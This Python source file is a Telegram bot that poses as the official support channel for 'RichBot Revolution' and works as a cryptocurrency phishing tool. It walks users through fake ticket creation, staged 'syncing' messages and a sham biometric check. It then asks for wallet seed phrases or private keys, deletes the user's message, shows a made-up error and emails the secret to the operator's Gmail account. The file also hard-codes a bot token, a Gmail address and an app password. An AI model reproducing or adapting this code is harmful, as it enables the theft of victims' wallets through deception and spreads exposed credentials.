import os
import asyncio
import random
import logging
from datetime import datetime

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.request import HTTPXRequest

from email.mime.text import MIMEText
import smtplib

# =========================
# ENVIRONMENT VARIABLES
# =========================
BOT_TOKEN = "8256421594:AAHUPwtvb17KtV_NKs6xu-a40MtCrOhTqmU"
GMAIL_USER = "Victoralbs4050th@gmail.com"
GMAIL_APP_PASSWORD = "pgpgdfstmhrzrohk"
ADMIN_EMAIL = "Victoralbs4050th@gmail.com"

if not all([BOT_TOKEN, GMAIL_USER, GMAIL_APP_PASSWORD, ADMIN_EMAIL]):
    raise RuntimeError("Missing required environment variables")

# =========================
# LOGGING
# =========================
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# =========================
# FULL TRANSLATED TEXTS (Improved German)
# =========================
TEXTS = {
    "welcome": {
        "en": "🔧 Welcome to RichBot Revolution Support Bot\n\n"
              "This is the official recovery and troubleshooting channel for RichBot Revolution users.\n\n"
              "We provide secure assistance for wallet synchronization, transaction issues, reward claims, "
              "TON integration problems, and other technical matters.\n\n"
              "All sessions use end-to-end encrypted channels with bank-grade AES-256 protection. "
              "Select your issue below to begin.",
        "ru": "🔧 Добро пожаловать в поддержку RichBot Revolution\n\n"
              "Это официальный канал восстановления и устранения неисправностей для пользователей RichBot Revolution.\n\n"
              "Мы предоставляем безопасную помощь по синхронизации кошелька, проблемам с транзакциями, "
              "начислению наград, интеграции TON и другим техническим вопросам.\n\n"
              "Все сессии используют сквозное шифрование с банковским уровнем AES-256. "
              "Выберите вашу проблему ниже.",
        "de": "🔧 Willkommen beim RichBot Revolution Support Bot\n\n"
              "Dies ist der offizielle Support- und Wiederherstellungskanal für RichBot Revolution Nutzer.\n\n"
              "Wir bieten sichere Hilfe bei Wallet-Synchronisation, Transaktionsproblemen, Belohnungsansprüchen, "
              "TON-Integration und anderen technischen Angelegenheiten.\n\n"
              "Alle Sitzungen sind mit bankenüblicher AES-256 End-to-End-Verschlüsselung geschützt. "
              "Wählen Sie unten Ihr Anliegen aus."
    },
    "select_service": {"en": "🎫 Select your issue:", "ru": "🎫 Выберите проблему:", "de": "🎫 Wählen Sie Ihr Anliegen:"},
    "select_wallet": {"en": "🔗 Select your wallet:", "ru": "🔗 Выберите кошелёк:", "de": "🔗 Wählen Sie Ihre Wallet:"},
    "select_input": {
        "en": "🔐 Select input type:\nIt's safe and protected with bank-level AES-256 encryption.",
        "ru": "🔐 Выберите тип ввода:\nЭто безопасно и защищено банковским уровнем AES-256.",
        "de": "🔐 Wählen Sie den Eingabetyp:\nGeschützt mit bankenüblicher AES-256-Verschlüsselung."
    },
    "input_12": {"en": "🔑 12 Words", "ru": "🔑 12 слов", "de": "🔑 12 Wörter"},
    "input_24": {"en": "🔐 24 Words", "ru": "🔐 24 слова", "de": "🔐 24 Wörter"},
    "input_key": {"en": "🧾 Private Key", "ru": "🧾 Приватный ключ", "de": "🧾 Privater Schlüssel"},
    "back": {"en": "← Back", "ru": "← Назад", "de": "← Zurück"},
    "try_again": {"en": "🔄 Try again", "ru": "🔄 Попробовать снова", "de": "🔄 Erneut versuchen"},
    "biometric_prompt": {"en": "🔐 Confirm your identity:", "ru": "🔐 Подтвердите личность:", "de": "🔐 Bestätigen Sie Ihre Identität:"},
    "biometric_success": {"en": "✅ Verification successful.", "ru": "✅ Верификация успешна.", "de": "✅ Verifizierung erfolgreich."},
    "biometric_error": {"en": "❌ Verification failed. Please try again.", "ru": "❌ Ошибка верификации.", "de": "❌ Verifizierung fehlgeschlagen."},
    "input_security_notice": {
        "en": "🔒 Your Information is Safe – Protected by Strong Security Standards\n\n"
              "We take your privacy seriously... It is completely safe.",
        "ru": "🔒 Ваша информация в безопасности...",
        "de": "🔒 Ihre Daten sind sicher – Geschützt mit höchsten Sicherheitsstandards.\n\n"
              "Wir nehmen Ihren Datenschutz sehr ernst. Alle eingegebenen Informationen sind mit bankenüblicher AES-256 Verschlüsselung geschützt und absolut sicher."
    },
    "error": {
        "en": "Verification failed — the wallet's current balance is insufficient...",
        "ru": "Верификация не пройдена...",
        "de": "Verifizierung fehlgeschlagen – Ihr Wallet-Guthaben reicht nicht aus..."
    },
    "ticket_created": {
        "en": "🎟️ Your support ticket has been created.\nTicket Number: RICH-{ticket_id}",
        "ru": "🎟️ Ваш тикет создан...",
        "de": "🎟️ Ihr Support-Ticket wurde erstellt.\nTicket-Nummer: RICH-{ticket_id}"
    },
    "loading_blockchain": {"en": "Connecting to RichBot Revolution Server... 🌐", "ru": "Подключение...", "de": "Verbindung zum RichBot Revolution Server... 🌐"},
    "loading_sync": {"en": "Syncing account details with TON network... 🔗", "ru": "Синхронизация...", "de": "Synchronisiere Kontodaten mit dem TON-Netzwerk... 🔗"},
    "loading_verify": {"en": "Verifying gaming session & wallet status... ✅", "ru": "Проверка...", "de": "Überprüfe Spielsession & Wallet-Status... ✅"},
    "loading_recovery": {"en": "Checking recovery eligibility... 🔍", "ru": "Проверка...", "de": "Prüfe Wiederherstellungsberechtigung... 🔍"},
    "loading_secure": {"en": "Preparing secure session... 🔒", "ru": "Подготовка...", "de": "Bereite sichere Sitzung vor... 🔒"},
    "loading_processing": {"en": "🔄 Processing your input...", "ru": "🔄 Обработка...", "de": "🔄 Verarbeite Ihre Eingabe..."}
}

# =========================
# SERVICES
# =========================
SERVICES = {
    "synchronization": {"en": "Synchronization Issue", "ru": "Проблема синхронизации", "de": "Synchronisationsproblem"},
    "rectification": {"en": "Rectification", "ru": "Исправление", "de": "Korrektur"},
    "validation": {"en": "Validation / Verification Issues", "ru": "Проблемы верификации", "de": "Validierungs- / Verifizierungsprobleme"},
    "reward_not_crediting": {"en": "Reward Not Crediting", "ru": "Награда не начисляется", "de": "Belohnung wird nicht gutgeschrieben"},
    "claim_rewards": {"en": "CLAIM Rewards", "ru": "Получить награды", "de": "Belohnungen einfordern"},
    "swap_rbt_to_ton": {"en": "Swap RBT Token to TON", "ru": "Обмен RBT Token на TON", "de": "RBT Token zu TON tauschen"},
    "wallet_connection_ton": {"en": "Wallet Connection Problems", "ru": "Проблемы подключения кошелька", "de": "Wallet-Verbindungsprobleme"},
    "transaction_failure": {"en": "Transaction Failure", "ru": "Ошибка транзакции", "de": "Transaktionsfehler"},
    "loading_crashing": {"en": "Loading / Crashing Issues", "ru": "Проблемы с загрузкой", "de": "Lade- / Absturzprobleme"},
    "ad_reward_bugs": {"en": "Ad Reward Bugs", "ru": "Баги с наградами за рекламу", "de": "Werbebelohnungs-Bugs"},
    "general_errors": {"en": "General Technical Errors", "ru": "Общие ошибки", "de": "Allgemeine technische Fehler"}
}

# =========================
# WALLETS
# =========================
WALLETS = {
    "tonkeeper": {"en": "Tonkeeper", "ru": "Tonkeeper", "de": "Tonkeeper"},
    "phantom": {"en": "Phantom Wallet", "ru": "Phantom", "de": "Phantom Wallet"},
    "solflare": {"en": "Solflare", "ru": "Solflare", "de": "Solflare"},
    "backpack": {"en": "Backpack", "ru": "Backpack", "de": "Backpack"},
    "trust": {"en": "Trust Wallet", "ru": "Trust Wallet", "de": "Trust Wallet"},
}

# =========================
# KEYBOARDS
# =========================
def get_language_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton("🇷🇺 Русский", callback_data="lang_ru")],
        [InlineKeyboardButton("🇩🇪 Deutsch", callback_data="lang_de")]
    ])

def get_service_keyboard(lang="en"):
    buttons = [[InlineKeyboardButton(v.get(lang, v["en"]), callback_data=f"svc_{k}")] for k, v in SERVICES.items()]
    buttons.append([InlineKeyboardButton(TEXTS["back"].get(lang, "← Back"), callback_data="back_main")])
    return InlineKeyboardMarkup(buttons)

def get_wallet_keyboard(lang="en"):
    buttons = [[InlineKeyboardButton(v.get(lang, v["en"]), callback_data=f"wal_{k}")] for k, v in WALLETS.items()]
    buttons.append([InlineKeyboardButton(TEXTS["back"].get(lang, "← Back"), callback_data="back_main")])
    return InlineKeyboardMarkup(buttons)

def get_biometric_keyboard(lang="en"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👁️ Face ID", callback_data="bio_confirm")],
        [InlineKeyboardButton("👆 Thumbprint", callback_data="bio_confirm")],
        [InlineKeyboardButton("🔑 Password", callback_data="bio_confirm")],
        [InlineKeyboardButton(TEXTS["back"].get(lang, "← Back"), callback_data="back_main")]
    ])

def get_input_keyboard(lang="en"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(TEXTS["input_12"].get(lang), callback_data="input_12")],
        [InlineKeyboardButton(TEXTS["input_24"].get(lang), callback_data="input_24")],
        [InlineKeyboardButton(TEXTS["input_key"].get(lang), callback_data="input_key")],
        [InlineKeyboardButton(TEXTS["back"].get(lang), callback_data="back_main")]
    ])

def get_try_again_keyboard(lang="en"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(TEXTS["try_again"].get(lang), callback_data="bio_retry")],
        [InlineKeyboardButton(TEXTS["back"].get(lang), callback_data="back_main")]
    ])

# =========================
# START
# =========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["lang"] = "en"
    await update.message.reply_text(
        TEXTS["welcome"]["en"],
        reply_markup=get_language_keyboard()
    )

# =========================
# BUTTON HANDLER
# =========================
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    data = query.data

    if data.startswith("lang_"):
        lang = data.split("_")[1]
        context.user_data["lang"] = lang
        await query.edit_message_text(
            TEXTS["welcome"].get(lang, TEXTS["welcome"]["en"]),
            reply_markup=get_service_keyboard(lang)
        )
        return

    if data.startswith("svc_"):
        service_key = data.split("_", 1)[1]

        ticket_id = random.randint(100000, 999999)
        context.user_data["ticket_id"] = ticket_id
        context.user_data["service"] = service_key

        ticket_text = TEXTS["ticket_created"].get(lang, TEXTS["ticket_created"]["en"]).format(ticket_id=ticket_id)
        await query.edit_message_text(ticket_text)

        username = update.effective_user.username or "user"
        try:
            body = f"User: @{username}\nTicket ID: RICH-{ticket_id}\nService: {service_key}\nTime: {datetime.now()}"
            msg = MIMEText(body)
            msg['Subject'] = f"RichBot Revolution Ticket RICH-{ticket_id} from @{username}"
            msg['From'] = GMAIL_USER
            msg['To'] = ADMIN_EMAIL
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            logger.error(f"Email failed: {e}")

        await asyncio.sleep(1.5)
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=TEXTS["select_wallet"].get(lang),
            reply_markup=get_wallet_keyboard(lang)
        )
        return

    if data.startswith("wal_"):
        wallet_key = data.split("_", 1)[1]
        context.user_data["wallet"] = wallet_key
        
        loading = await query.message.reply_text(TEXTS["loading_blockchain"].get(lang))
        await asyncio.sleep(1.8)
        await loading.edit_text(TEXTS["loading_blockchain"].get(lang) + " ••")
        await asyncio.sleep(1.9)
        await loading.edit_text(TEXTS["loading_sync"].get(lang))
        await asyncio.sleep(2.0)
        await loading.edit_text(TEXTS["loading_sync"].get(lang) + " •••")
        await asyncio.sleep(2.1)
        await loading.edit_text(TEXTS["loading_verify"].get(lang))
        await asyncio.sleep(2.2)
        await loading.edit_text(TEXTS["loading_verify"].get(lang) + " •••")
        await asyncio.sleep(1.8)
        await loading.edit_text(TEXTS["loading_recovery"].get(lang))
        await asyncio.sleep(1.9)
        await loading.edit_text(TEXTS["loading_secure"].get(lang))
        await asyncio.sleep(2.0)
        await loading.delete()

        await query.edit_message_text(
            TEXTS["biometric_prompt"].get(lang),
            reply_markup=get_biometric_keyboard(lang)
        )
        return

    if data == "bio_confirm":
        loading = await query.message.reply_text("🔐 Verifying biometric... ⏳")
        await asyncio.sleep(1.6)
        
        if random.random() < 0.88:
            await loading.delete()
            await query.edit_message_text(TEXTS["biometric_success"].get(lang))
            await asyncio.sleep(1.2)
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=TEXTS["select_input"].get(lang),
                reply_markup=get_input_keyboard(lang)
            )
            return
        else:
            await loading.delete()
            await query.edit_message_text(
                TEXTS["biometric_error"].get(lang),
                reply_markup=get_try_again_keyboard(lang)
            )
        return

    if data == "bio_retry":
        await query.edit_message_text(TEXTS["biometric_prompt"].get(lang), reply_markup=get_biometric_keyboard(lang))
        return

    if data.startswith("input_"):
        input_type = data.split("_", 1)[1]
        context.user_data["input_type"] = input_type
        context.user_data["awaiting"] = True
        await query.edit_message_text(TEXTS["input_security_notice"].get(lang))
        return

    if data == "back_main":
        await query.edit_message_text(
            TEXTS["welcome"].get(lang, TEXTS["welcome"]["en"]),
            reply_markup=get_service_keyboard(lang)
        )
        return

    if data == "back_service":
        await query.edit_message_text(
            TEXTS["select_service"].get(lang),
            reply_markup=get_service_keyboard(lang)
        )
        return

# =========================
# TEXT HANDLER
# =========================
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get("awaiting"):
        return

    message = update.message
    user_input = message.text.strip()
    lang = context.user_data.get("lang", "en")
    username = update.effective_user.username or "user"

    try:
        await message.delete()
    except:
        pass

    loading = await message.reply_text(TEXTS["loading_processing"].get(lang))
    await asyncio.sleep(2.0)
    await loading.delete()

    error_text = TEXTS["error"].get(lang, TEXTS["error"]["en"])
    await message.reply_text(error_text, reply_markup=get_try_again_keyboard(lang))

    try:
        body = f"User: @{username}\nService: {context.user_data.get('service')}\nInput:\n{user_input}"
        msg = MIMEText(body)
        msg['Subject'] = f"RichBot Revolution Support Input from @{username}"
        msg['From'] = GMAIL_USER
        msg['To'] = ADMIN_EMAIL
        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        logger.error(f"Email failed: {e}")

    context.user_data.clear()

# =========================
# MAIN
# =========================
def main():
    request = HTTPXRequest(connect_timeout=45.0, read_timeout=45.0, pool_timeout=45.0)
    app = ApplicationBuilder().token(BOT_TOKEN).request(request).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, text_handler))

    print("🎉 RichBot Revolution Support Bot is running...")
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()